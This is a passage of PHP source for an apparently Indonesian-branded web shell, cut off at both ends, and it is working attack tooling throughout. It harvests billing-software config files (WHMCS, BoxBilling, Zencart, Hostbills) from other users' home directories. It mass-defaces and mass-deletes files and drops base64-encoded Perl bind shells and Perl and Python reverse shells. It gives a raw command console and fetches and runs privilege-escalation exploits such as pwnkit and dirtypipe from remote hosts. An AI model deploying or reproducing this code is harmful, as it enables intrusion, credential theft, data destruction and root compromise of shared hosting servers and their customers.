							"/home/$stillgalau/Support/submitticket.php" => "WHMCS",
							"/home/$stillgalau/support/submitticket.php" => "WHMCS",
							"/home/$stillgalau/BILLING/submitticket.php" => "WHMCS",
							"/home/$stillgalau/Billing/submitticket.php" => "WHMCS",
							"/home/$stillgalau/billing/submitticket.php" => "WHMCS",
							"/home/$stillgalau/BUY/submitticket.php" => "WHMCS",
							"/home/$stillgalau/Buy/submitticket.php" => "WHMCS",
							"/home/$stillgalau/buy/submitticket.php" => "WHMCS",
							"/home/$stillgalau/MANAGE/submitticket.php" => "WHMCS",
							"/home/$stillgalau/Manage/submitticket.php" => "WHMCS",
							"/home/$stillgalau/manage/submitticket.php" => "WHMCS",
							"/home/$stillgalau/CLIENTSUPPORT/submitticket.php" => "WHMCS",
							"/home/$stillgalau/ClientSupport/submitticket.php" => "WHMCS",
							"/home/$stillgalau/Clientsupport/submitticket.php" => "WHMCS",
							"/home/$stillgalau/clientsupport/submitticket.php" => "WHMCS",
							"/home/$stillgalau/CHECKOUT/submitticket.php" => "WHMCS",
							"/home/$stillgalau/Checkout/submitticket.php" => "WHMCS",
							"/home/$stillgalau/checkout/submitticket.php" => "WHMCS",
							"/home/$stillgalau/BILLINGS/submitticket.php" => "WHMCS",
							"/home/$stillgalau/Billings/submitticket.php" => "WHMCS",
							"/home/$stillgalau/billings/submitticket.php" => "WHMCS",
							"/home/$stillgalau/BASKET/submitticket.php" => "WHMCS",
							"/home/$stillgalau/Basket/submitticket.php" => "WHMCS",
							"/home/$stillgalau/basket/submitticket.php" => "WHMCS",
							"/home/$stillgalau/SECURE/submitticket.php" => "WHMCS",
							"/home/$stillgalau/Secure/submitticket.php" => "WHMCS",
							"/home/$stillgalau/secure/submitticket.php" => "WHMCS",
							"/home/$stillgalau/SALES/submitticket.php" => "WHMCS",
							"/home/$stillgalau/Sales/submitticket.php" => "WHMCS",
							"/home/$stillgalau/sales/submitticket.php" => "WHMCS",
							"/home/$stillgalau/BILL/submitticket.php" => "WHMCS",
							"/home/$stillgalau/Bill/submitticket.php" => "WHMCS",
							"/home/$stillgalau/bill/submitticket.php" => "WHMCS",
							"/home/$stillgalau/PURCHASE/submitticket.php" => "WHMCS",
							"/home/$stillgalau/Purchase/submitticket.php" => "WHMCS",
							"/home/$stillgalau/purchase/submitticket.php" => "WHMCS",
							"/home/$stillgalau/ACCOUNT/submitticket.php" => "WHMCS",
							"/home/$stillgalau/Account/submitticket.php" => "WHMCS",
							"/home/$stillgalau/account/submitticket.php" => "WHMCS",
							"/home/$stillgalau/USER/submitticket.php" => "WHMCS",
							"/home/$stillgalau/User/submitticket.php" => "WHMCS",
							"/home/$stillgalau/user/submitticket.php" => "WHMCS",
							"/home/$stillgalau/CLIENTS/submitticket.php" => "WHMCS",
							"/home/$stillgalau/Clients/submitticket.php" => "WHMCS",
							"/home/$stillgalau/clients/submitticket.php" => "WHMCS",
							"/home/$stillgalau/BILLINGS/submitticket.php" => "WHMCS",
							"/home/$stillgalau/Billings/submitticket.php" => "WHMCS",
							"/home/$stillgalau/billings/submitticket.php" => "WHMCS",
							"/home/$stillgalau/MY/submitticket.php" => "WHMCS",
							"/home/$stillgalau/My/submitticket.php" => "WHMCS",
							"/home/$stillgalau/my/submitticket.php" => "WHMCS",
							"/home/$stillgalau/secure/whm/submitticket.php" => "WHMCS",
							"/home/$stillgalau/secure/whmcs/submitticket.php" => "WHMCS",
							"/home/$stillgalau/panel/submitticket.php" => "WHMCS",
							"/home/$stillgalau/clientes/submitticket.php" => "WHMCS",
							"/home/$stillgalau/cliente/submitticket.php" => "WHMCS",
							"/home/$stillgalau/support/order/submitticket.php" => "WHMCS",
							"/home/$stillgalau/bb-config.php" => "BoxBilling",
							"/home/$stillgalau/boxbilling/bb-config.php" => "BoxBilling",
							"/home/$stillgalau/box/bb-config.php" => "BoxBilling",
							"/home/$stillgalau/host/bb-config.php" => "BoxBilling",
							"/home/$stillgalau/Host/bb-config.php" => "BoxBilling",
							"/home/$stillgalau/supportes/bb-config.php" => "BoxBilling",
							"/home/$stillgalau/support/bb-config.php" => "BoxBilling",
							"/home/$stillgalau/hosting/bb-config.php" => "BoxBilling",
							"/home/$stillgalau/cart/bb-config.php" => "BoxBilling",
							"/home/$stillgalau/order/bb-config.php" => "BoxBilling",
							"/home/$stillgalau/client/bb-config.php" => "BoxBilling",
							"/home/$stillgalau/clients/bb-config.php" => "BoxBilling",
							"/home/$stillgalau/cliente/bb-config.php" => "BoxBilling",
							"/home/$stillgalau/clientes/bb-config.php" => "BoxBilling",
							"/home/$stillgalau/billing/bb-config.php" => "BoxBilling",
							"/home/$stillgalau/billings/bb-config.php" => "BoxBilling",
							"/home/$stillgalau/my/bb-config.php" => "BoxBilling",
							"/home/$stillgalau/secure/bb-config.php" => "BoxBilling",
							"/home/$stillgalau/support/order/bb-config.php" => "BoxBilling",
							"/home/$stillgalau/includes/dist-configure.php" => "Zencart",
							"/home/$stillgalau/zencart/includes/dist-configure.php" => "Zencart",
							"/home/$stillgalau/products/includes/dist-configure.php" => "Zencart",
							"/home/$stillgalau/cart/includes/dist-configure.php" => "Zencart",
							"/home/$stillgalau/shop/includes/dist-configure.php" => "Zencart",
							"/home/$stillgalau/includes/iso4217.php" => "Hostbills",
							"/home/$stillgalau/hostbills/includes/iso4217.php" => "Hostbills",
							"/home/$stillgalau/host/includes/iso4217.php" => "Hostbills",
							"/home/$stillgalau/Host/includes/iso4217.php" => "Hostbills",
							"/home/$stillgalau/supportes/includes/iso4217.php" => "Hostbills",
							"/home/$stillgalau/support/includes/iso4217.php" => "Hostbills",
							"/home/$stillgalau/hosting/includes/iso4217.php" => "Hostbills",
							"/home/$stillgalau/cart/includes/iso4217.php" => "Hostbills",
							"/home/$stillgalau/order/includes/iso4217.php" => "Hostbills",
							"/home/$stillgalau/client/includes/iso4217.php" => "Hostbills",
							"/home/$stillgalau/clients/includes/iso4217.php" => "Hostbills",
							"/home/$stillgalau/cliente/includes/iso4217.php" => "Hostbills",
							"/home/$stillgalau/clientes/includes/iso4217.php" => "Hostbills",
							"/home/$stillgalau/billing/includes/iso4217.php" => "Hostbills",
							"/home/$stillgalau/billings/includes/iso4217.php" => "Hostbills",
							"/home/$stillgalau/my/includes/iso4217.php" => "Hostbills",
							"/home/$stillgalau/secure/includes/iso4217.php" => "Hostbills",
							"/home/$stillgalau/support/order/includes/iso4217.php" => "Hostbills");
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("Galauers_CONFIG/$stillgalau-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
		}	
	}
	echo "<center><a style='text-decoration:none;color:white;' href='?path=$path/Galauers_CONFIG'><font>Click Here</font></a></center>";
		}
		// adminer
		if($_7['id'] == 'adminer'){
			echo "<center class='anu'><b>Get Adminer</b><br>";
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<gr><a style='color:white;text-decoration:none;' href='$full/adminer.php' target='_blank'>Click Here</a></gr></center>";
	} else {
		if(adminer("http://eviltw.in/files/adminer.txt","adminer.php")) {
			echo "<gr><a style='color:white;text-decoration:none;' href='$full/adminer.php' target='_blank'>Click Here</a></gr></center>";
		} else {
			echo "<rd>Failed to create adminer:(</rd>";}
		} echo "</center>";
	}
		// mass deface
		if($_7['id'] == 'deface'){
		function mass_all($dir,$namefile,$contents_sc) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$▚ = $dirc.'/'.$namefile;
				if($dirb === '.') {
					file_put_contents($▚, $contents_sc);
				} elseif($dirb === '..') {
					file_put_contents($▚, $contents_sc);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$▚<br>";
							file_put_contents($▚, $contents_sc);
							$▟ = mass_all($dirc,$namefile,$contents_sc);
							}
						}
					}
				}
			}
		}
		function mass_onedir($dir,$namefile,$contents_sc) {
			if(is_writable($dir)) {
				$dira = scandir($dir);
				foreach($dira as $dirb) {
					$dirc = "$dir/$dirb";
					$▚ = $dirc.'/'.$namefile;
					if($dirb === '.') {
						file_put_contents($▚, $contents_sc);
					} elseif($dirb === '..') {
						file_put_contents($▚, $contents_sc);
					} else {
						if(is_dir($dirc)) {
							if(is_writable($dirc)) {
								echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$dirb/$namefile<br>";
								file_put_contents($▚, $contents_sc);
							}
						}
					}
				}
			}
		}
		if($_7['start']) {
			if($_7['tipe'] == 'mass') {
			mass_all($_7['d_dir'], $_7['d_file'], $_7['script']);
			} elseif($_7['tipe'] == 'onedir') {
			mass_onedir($_7['d_dir'], $_7['d_file'], $_7['script']);
			}
		}
		s();
		echo "
		<div class='card card-body text-dark input-group mb-3'>
			<form method='POST'> Tipe:
			<div class='form-check'>
				<input class='form-check-input' type='checkbox' value='onedir' name='tipe' id='flexCheckDefault' checked>
				<label class='form-check-label' for='flexCheckDefault'>One dir</label>
			</div>
			<div class='form-check'>
				<input class='form-check-input' type='checkbox' value='mass' name='tipe' id='flexCheckDefault'>
				<label class='form-check-label' for='flexCheckDefault'>All directory</label>
			</div>
				<i class='bi bi-folder'></i> Directory:
				<input class='form-control btn-sm' type='text' name='d_dir' value='$dir'>
				<i class='bi bi-file-earmark'></i> Filename:
				<input class='form-control btn-sm' type='text' name='d_file' placeholder='readme.txt'>
				<i class='bi bi-file-earmark'></i> Your Script:
				<textarea class='form-control btn-sm' rows='7' name='script' placeholder='Hacked by Galauers'></textarea>
				<div class='d-grid gap-2'>
					<input class='btn btn-dark btn-sm' type='submit' name='start' value='Deface!'>
				</div>
			</form>
		</div>";
		}
		// mass delete
		if($_7['id'] == 'delete'){
		function mass_delete($dir,$namefile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$▚ = $dirc.'/'.$namefile;
				if($dirb === '.') {
					if(file_exists("$dir/$namefile")) {
						unlink("$dir/$namefile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namefile")) {
						unlink("".dirname($dir)."/$namefile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($▚)) {
								echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$▚<br>";
								unlink($▚);
								$▟ = mass_delete($dirc,$namefile);
								}
							}
						}
					}
				}
			}
		}
		if($_7['start']) {
			mass_delete($_7['d_dir'], $_7['d_file']);
		}
		s();
		echo "
		<div class='card card-body text-dark input-group mb-3'>
			<form method='POST'>
				<i class='bi bi-folder'></i> Directory:
				<input class='form-control btn-sm' type='text' name='d_dir' value='$dir' $_r>
					<i class='bi bi-file-earmark'></i> Filename:
				<div class='input-group'>
					<input class='form-control btn-sm' type='text' name='d_file' placeholder='filename' $_r><br>
					<div class='input-group-append'>
						<input class='btn btn-dark btn-sm' type='submit' name='start' value='Delete!'>
					</div>
				</div>
			</form>
		</div>";
		}
		// phpinfo 
		//if($_7['id'] == 'phpinfo'){
			//@ob_start();
			//@eval("phpinfo();");
			//$buff = @ob_get_contents();
			//@ob_end_clean();	
			//$front = strpos($buff,"<body>")+6;
			//$end = strpos($buff,"</body>");
			//echo "<pre class='php_info'>".substr($buff,$front,$front-$front)."</pre>";
			//exit;
		//}
		// network
		if($_7['id'] == 'network'){
		s();
		echo "
		<div class='card text-dark'>
			<div class='card-header'>
				<form method='post'>
					Bind port to /bin/sh [perl]<br>
					Port:
				<div class='input-group'>
					<input class='form-control btn-sm' type='text' name='port' placeholder='1337'>
					<input class='btn btn-dark btn-sm' type='submit' name='bpl' value='Submit!'>
				</div>
			Back Connect<br>
			Server:
				<input class='form-control btn-sm' type='text' name='server' placeholder='". $_SERVER['REMOTE_ADDR'] ."'>
			Port:
			<div class='input-group'>
				<input class='form-control btn-sm' type='text' name='port' placeholder='1337'>
				<select class='form-control btn-sm' name='bc'>
					<option value='perl'>perl</option>
					<option value='python'>python</option>
				</select>
			</div>
			<div class='d-grid gap-2'>
				<input class='btn btn-dark btn-sm btn-block' type='submit' value='Submit!'>
			</div>
		</form>";
		if($_7['bpl']){
			$bp = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=");
			$brt = @fopen('bp.pl','w');
			fwrite($brt,$bp);
			$out = exe("perl bp.pl ".$_7['port']." 1>/dev/null 2>&1 &");
			sleep(1);
			echo "<pre>$outn".exe("ps aux | grep bp.pl")."</pre>";
			unlink("bp.pl");
		}
		if($_7['bc'] == 'perl'){
			$bc = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7");
			$plbc = @fopen('bc.pl','w');
			fwrite($plbc,$bc);
			$out = exe("perl bc.pl ".$_7['server']." ".$_7['port']." 1>/dev/null 2>&1 &");
			sleep(1);
			echo "<pre>$outn".exe("ps aux | grep bc.pl")."</pre>";
			unlink("bc.pl");
		}
		if($_7['bc'] == 'python'){
			$bc_py = base64_decode("IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBNci54QmFyYWt1ZGFcblRoYW5rcyBHb29nbGUgRm9yIFJlZmVyZW5zaVxuXG4nJycpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMCkNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwxKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDIpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMykNCiAgICBzaGVsbCA9IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQ0KICBleGNlcHQgc29ja2V0LnRpbWVvdXQ6DQogICAgcHJpbnQgIlRpbU91dCINCiAgZXhjZXB0IHNvY2tldC5lcnJvciwgZToNCiAgICBwcmludCAiRXJyb3IiLCBlDQpweWJhY2tjb25uZWN0KCk=");
			$pbc_py = @fopen('bcpy.py','w');
			fwrite($pbc_py,$bc_py);
			$out_py = exe("python bcpy.py ".$_7['server']." ".$_7['port']);
			sleep(1);
			echo "<pre>$out_pyn".exe("ps aux | grep bcpy.py")."</pre>";
			unlink("bcpy.py");
			}
			echo "</div>
			</div>
		<br/>";
		}
		// console
		if($_7['id'] == 'cmd') {
		s();
		if(!empty($_POST['cmd'])) {
			$cmd = exe($_POST['cmd'].' 2>&1');
		}
		echo "
		<div class='mb-3'>
			<form method='POST'>
				<div class='input-group mb-3'>
					<input class='form-control btn-sm' type='text' name='cmd' value='".htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8')."' placeholder='dir' $_r>
					<button class='btn btn-outline-light btn-sm' type='sumbit'><i class='bi bi-arrow-return-right'></i></button>
				</div>
			</form>";
			if($cmd):
			echo '
			<div class="container-fluid language-javascript">
				<div class="shell mb-3">
					<pre style="font-size:10px;">$&nbsp;<rd>'.htmlspecialchars($_POST['cmd']).'</rd><br><code>'.htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8').'</code></pre>
				</div>
			</div>';
			elseif(!$cmd && $_SERVER['REQUEST_METHOD'] == 'POST'):
			echo '
			<div class="container-fluid language-javascript">
				<div class="shell mb-3">
					<pre style="font-size:10px;"><code>No result</code></pre>
				</div>
			</div>
		</div>';
		endif;
		}
		// multiple file upload
		if($_7['id'] == 'upload'){
		s();
		if(isset($_7['upl'])){
			$result = count($_FILES['file']['name']);
			for($contents=0;$contents<$result;$contents++){
				$namefile = $_FILES['file']['name'][$contents];
					$up = @copy($_FILES['file']['tmp_name'][$contents],"$path/".$namefile);
				}
				if($result < 2){
					if($up){
					echo "<strong>Upload</strong> $namefile OK! ".ok()."</div>";
				}else{
				echo '<strong>Upload</strong> FAIL! '.er().'</div>';
				}
			}else{
			echo "<strong>Upload</strong> $result OK! ".ok()."</div>";
			}
		}
		echo "
		<div class='card card-body text-dark input-group mb-3'>
		Multiple File Upload
			<form method='POST' enctype='multipart/form-data'>
				<div class='input-group'>
					<input class='form-control form-control-sm' type='file' name='file[]' multiple='' $_r>
					<input class='btn btn-dark btn-sm' type='submit' name='upl' value='Go!'>
				</div>
			</form>
		</div>";
			}
		}
		// scanner root
		if (isset($_GET['dir']) && $_GET['id'] == "scanroot") {
			ob_implicit_flush();ob_end_flush();s();
			echo "
			<div class='text-center'>
				<div class='btn-group mb-3'>
					<a class='btn btn-outline-light btn-sm' href=http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']."&id_two=autoscan'><i class='bi bi-bug'></i> Auto Scan </a>
					<a class='btn btn-outline-light btn-sm' href=http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']."&id_two=scansd'><i class='bi bi-search'></i> Scan SUID </a>
					<a class='btn btn-outline-light btn-sm' href=http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']."&id_two=esg'><i class='bi bi-search'></i> Exploit Suggester </a>
				</div>
			</div>";
			if (!function_exists("proc_open")) {
				echo "<center class='anu'>Command is Disabled !</center>";
			}
			if (!is_writable($path)) {
				echo "<center class='anu'>Current Directory is Unwriteable !</center>";
			}
			if (isset($_GET['id_two']) && $_GET['id_two'] == "autoscan") {
				if (!file_exists($path."/Galauers_ROOTING/")) {
					mkdir($path."/Galauers_ROOTING");
					exe_root("curl https://raw.githubusercontent.com/bypass-shell/rootshell/main/auto.tar.gz -o auto.tar.gz", $path."/Galauers_ROOTING");
					exe_root("tar -xf auto.tar.gz", $path."/Galauers_ROOTING");
					if (!file_exists($path."/Galauers_ROOTING/netfilter")) {
						die("<center class='anu'>Failed to Download Material !</center>");
					}
				}
				echo '
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>Netfilter : '.exe_root("timeout 10 ./Galauers_ROOTING/netfilter", $path).'Ptrace : '.exe_root("echo id | timeout 10 ./Galauers_ROOTING/ptrace", $path).'Sequoia : '.exe_root("timeout 10 ./Galauers_ROOTING/sequoia", $path).'OverlayFS : '.exe_root("echo id | timeout 10 ./overlayfs", $path."/Galauers_ROOTING").'Dirtypipe : '.exe_root("echo id | timeout 10 ./Galauers_ROOTING/dirtypipe /usr/bin/su", $path).'Sudo : '.exe_root("echo 12345 | timeout 10 sudoedit -s Y", $path).'Pwnkit : '.exe_root("echo id | timeout 10 ./pwnkit", $path."/Galauers_ROOTING").''.exe_root("rm -rf Galauers_ROOTING", $path).'</code></pre>
					</div>
				</div>';
			} elseif (isset($_GET['id_two']) && $_GET['id_two'] == "scansd") {
				echo '<center class="anu">[+] Scanning ...</center>';
				echo '
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>'.exe_root("find / -perm -u=s -type f 2>/dev/null", $path).'</code></pre>
					</div>
				</div>';
			} elseif (isset($_GET['id_two']) && $_GET['id_two'] == "esg") {
				echo '<center class="anu">[+] Loading ...</center>';
				echo '
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>'.exe_root("curl -Lsk http://raw.githubusercontent.com/bypass-shell/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash", $path).'</code></pre>
					</div>
				</div>';
			}
		}
		// openfile
		if(isset($_7['opn'])) {
			$file = $_7['opn'];
		}	
		// view
		if($_7['action'] == 'view') {
		s();
		echo "
		<div class='btn-group'>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$file'><i class='bi bi-eye-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=delete_file&opn=$file'><i class='bi bi-trash-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=download&opn=$file'><i class='bi bi-download'></i></a>
		</div>
		<br>
			<i class='bi bi-file-earmark'></i>:&nbsp;".basename($file)."
		</br>
		<div class='bg-dark'>
			<div class='container-fluid language-javascript'>
				<textarea rows='10' class='form-control' disabled=''>".htmlspecialchars(file_get_contents($file))."</textarea>
			</div>
		</div>";
		}
		// edit
		if(isset($_7['edit_file'])) {
			$updt = fopen("$file", "w");
			$result = fwrite($updt, $_7['contents']);		
			if ($result) {
		echo '<strong>Edit file</strong> OK! '.ok().'</div>';
			}else{
		echo '<strong>Edit file</strong> FAIL! '.er().'</div>';
			}
		}
		if($_7['action'] == 'edit') {
		s();
		echo "
		<div class='btn-group'>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$file'><i class='bi bi-eye-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=delete_file&opn=$file'><i class='bi bi-trash-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=download&opn=$file'><i class='bi bi-download'></i></a>
		</div>
		<br>
			<i class='bi bi-file-earmark'></i>:&nbsp;".basename($file)."
		</br>
		<form method='POST'>
			<textarea class='form-control btn-sm' rows='10' name='contents' $_r>".htmlspecialchars(file_get_contents($file))."</textarea>
			<div class='d-grid gap-2'>
				<button class='btn btn-outline-light btn-sm' type='sumbit' name='edit_file'><i class='bi bi-arrow-return-right'></i></button>
			</div>
		</form>";
		}
		//rename folder
		if($_7['action'] == 'rename_folder') {
			if($_7['r_d']) {
				$r_d = rename($dir, "".dirname($dir)."/".htmlspecialchars($_7['r_d'])."");
				if($r_d) {
		echo '<strong>Rename folder</strong> OK! '.ok().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
				}else{
		echo '<strong>Rename folder</strong> FAIL! '.er().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
				}
			}
		s();
		echo "
		<div class='btn-group'>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename_folder'><i class='bi bi-pencil-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=delete_folder'><i class='bi bi-trash-fill'></i></a>
		</div>
		<br>
			<i class='bi bi-folder-fill'></i>:&nbsp;".basename($dir)."
		</br>
		<form method='POST'>
			<div class='input-group'>
				<input class='form-control btn-sm' type='text' value='".basename($dir)."' name='r_d' $_r>
				<button class='btn btn-outline-light btn-sm' type='submit'><i class='bi bi-arrow-return-right'></i></button>
			</div>
		</form>";
		}
		//rename file
		if(isset($_7['r_f'])) {
			$old = $file;
			$new = $_7['new_name'];
			rename($new, $old);
			if(file_exists($new)) {
		echo '<div class="alert alert-warning alert-dismissible fade show my-3" role="alert">
			<strong>Rename file</strong> name already in use! <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
		</div>';
			}else{
		if(rename($old, $new)) {
		echo '<strong>Rename file</strong> OK! '.ok().'</div>';
			}else{
		echo '<strong>Rename file</strong> FAIL! '.er().'</div>';
				}
			}
		}
		if($_7['action'] == 'rename') {
		s();
		echo "
		<div class='btn-group'>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$file'><i class='bi bi-eye-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=delete_file&opn=$file'><i class='bi bi-trash-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=download&opn=$file'><i class='bi bi-download'></i></a>
		</div>
		<br>
			<i class='bi bi-file-earmark'></i>:&nbsp;".basename($file)."
		</br>
		<form method='POST'>
			<div class='input-group'>
				<input class='form-control btn-sm' type='text' name='new_name' value='".basename($file)."' $_r>
				<button class='btn btn-outline-light btn-sm' type='sumbit' name='r_f'><i class='bi bi-arrow-return-right'></i></button>
			</div>
		</form>";
		}
		//delete file
		if ($_7['action'] == 'delete_file') {
		s();
		if ($_7['yeahx']) {
			$delete = unlink($file);
			if ($delete) {
		echo '<strong>Delete file</strong> OK! '.ok().'</div>';
			}else{
		echo '<strong>Delete file</strong> FAIL! '.er().'</div>';
			}
		}
		echo "
		<div class='btn-group mb-3'>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$file'><i class='bi bi-eye-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=delete_file&opn=$file'><i class='bi bi-trash-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=download&opn=$file'><i class='bi bi-download'></i></a>
		</div>
		<div class='card card-body text-dark input-group mb-3'>
			<p>Are you sure to delete : ".basename($file)." ?</p>
			<form method='POST'>
				<a class='btn btn-danger btn-block btn-sm' href='?dir=$dir'>No</a>
				<input type='submit' name='yeahx' class='btn btn-success btn-block btn-sm' value='Yes'>
			</form>
		</div>";
		}
		//delete folder
		if ($_7['action'] == 'delete_folder' ) {
		s();
		if ($_7['yeah']) {
			if(is_dir($dir)) {
			if(is_writable($dir)) {
				@rmdir($dir);
				@exe("rm -rf $dir");
				@exe("rmdir /s /q $dir");
		echo '<strong>Delete folder</strong> OK! '.ok().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
				} else {
		echo '<strong>Delete folder</strong> FAIL! '.er().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
				}
			}
		}
		echo "
		<div class='btn-group mb-3'>
